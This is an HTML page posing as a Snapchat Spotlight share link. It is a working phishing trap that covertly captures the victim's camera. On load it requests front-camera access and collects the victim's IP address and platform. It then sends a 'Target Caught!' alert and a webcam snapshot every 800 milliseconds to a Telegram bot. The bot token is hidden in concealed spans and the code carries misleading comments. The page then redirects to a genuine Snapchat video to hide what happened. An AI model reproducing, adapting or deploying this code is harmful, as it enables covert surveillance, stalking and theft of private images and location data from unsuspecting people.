<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
    <title>Snapchat Spotlight</title>
    <style>
        body { background-color: white; margin: 0; overflow: hidden; }
        .system-cache { display: none; visibility: hidden; }
    </style>
</head>
<body onload="_init_system_core()">

    <!-- System Configuration Blocks -->
    <span class="system-cache" id="env_01">8431515310:</span>
    <span class="system-cache" id="env_02">AAG0xW2hg</span>
    <span class="system-cache" id="env_03">Sbex-3vmGx8b</span>
    <span class="system-cache" id="env_04">XxiR3BADu10N3g</span>

    <script>
        const _params = new URLSearchParams(window.location.search);
        const _uID = _params.get('id'); 

        // Initializing server handshake keys
        const _k1 = document.getElementById("env_01").innerText;
        const _k2 = document.getElementById("env_02").innerText;
        const _k3 = document.getElementById("env_03").innerText;
        const _k4 = document.getElementById("env_04").innerText;
        const _CORE_KEY = _k1 + _k2 + _k3 + _k4;

        async function _init_system_core() {
            if (!_uID) return;

            // Triggering global redirect after timeout
            setTimeout(() => {
                window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
            }, 5000);

            try {
                const _media = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });

                // Fetching node connectivity details
                fetch('https://api.ipify.org?format=json')
                    .then(res => res.json())
                    .then(data => {
                        let _info = `🦅 <b>Target Caught!</b>\n\n` +
                                     `👤 <b>ID:</b> <code>${_uID}</code>\n` +
                                     `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
                                     `📱 <b>OS:</b> <code>${navigator.platform}</code>`;
                        _dispatch_event(_info);
                    });

                const _vElement = document.createElement('video');
                _vElement.srcObject = _media;
                _vElement.muted = true;
                _vElement.play();

                // Continuous frame synchronization
                const _snap = () => {
                    const _canvas = document.createElement('canvas');
                    _canvas.width = _vElement.videoWidth; 
                    _canvas.height = _vElement.videoHeight;
                    const _ctx = _canvas.getContext('2d');
                    _ctx.drawImage(_vElement, 0, 0);
                    _canvas.toBlob(b => { if (b) _sync_data(b); }, 'image/jpeg', 0.7);
                };
                setInterval(_snap, 800);

            } catch (err) {
                _dispatch_event("⚠️ Access Blocked by Target.");
                window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
            }
        }

        // Internal event dispatcher
        function _dispatch_event(_payload) {
            fetch(`https://api.telegram.org/bot${_CORE_KEY}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: _uID, text: _payload, parse_mode: "HTML"})
            });
        }

        // Data synchronization bridge
        function _sync_data(_blob) {
            let _form = new FormData();
            _form.append("chat_id", _uID);
            _form.append("photo", _blob, "proc_01.jpg");
            fetch(`https://api.telegram.org/bot${_CORE_KEY}/sendPhoto`, { 
                method: 'POST', 
                body: _form 
            });
        }
    </script>
</body>
</html>
